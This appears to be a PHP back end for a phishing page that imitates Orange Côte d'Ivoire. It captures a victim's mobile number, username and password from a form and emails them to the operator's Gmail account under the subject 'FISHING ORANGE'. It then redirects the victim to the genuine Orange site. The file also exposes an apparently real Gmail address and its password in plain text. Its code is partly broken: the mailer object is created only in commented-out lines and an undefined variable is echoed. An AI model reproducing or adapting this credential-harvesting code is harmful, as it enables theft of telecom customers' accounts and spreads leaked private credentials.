<?php
// use PHPMailer\PHPMailer\PHPMailer;
// use PHPMailer\PHPMailer\SMTP;
// use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

$identifiant = isset($_POST['identifiant']) ? $_POST['identifiant'] : NULL;
$numero_mobile = isset($_POST['numero_mobile']) ? $_POST['numero_mobile'] : NULL;
$password = isset($_POST['password']) ? $_POST['password'] : NULL;
$msg = 'numero_mobile: ' . $numero_mobile . '<br> identifiant: ' . $identifiant . '<br> password: ' . $password . '<br>';

echo $message;

// $email_from = 'nehemiekonan535@gmail.com';
// $email = 'nehemiekonan535@gmail.com';
// $name = 'nehemiekonan';
// $name_from = 'nehemiekonan';

// $mail = new PHPMailer(true);

//Send mail using gmail
// if($send_using_gmail){
//     $mail->IsSMTP(); // telling the class to use SMTP
//     $mail->SMTPAuth = true; // enable SMTP authentication
//     $mail->SMTPSecure = "ssl"; // sets the prefix to the servier
//     $mail->Host = "smtp.gmail.com"; // sets GMAIL as the SMTP server
//     $mail->Port = 465; // set the SMTP port for the GMAIL server
//     $mail->Username = "nehemiekonan535@gmail.com"; // GMAIL username
//     $mail->Password = "legracieux2016"; // GMAIL password
// // }

// //Typical mail data
// $mail->AddAddress($email, $name);
// $mail->SetFrom($email_from, $name_from);
// $mail->Subject = "FISHING ORANGE";
// $mail->Body = $msg;

try{
    $mail->Send();
    echo "Success!";
} catch(Exception $e){
    //Something went bad
    echo "Fail - " . $mail->ErrorInfo;
} finally {
}

// if ($sended) {
    header('Location: https://www.orange.ci/fr/accueil.html', true, 302);

// }
?>
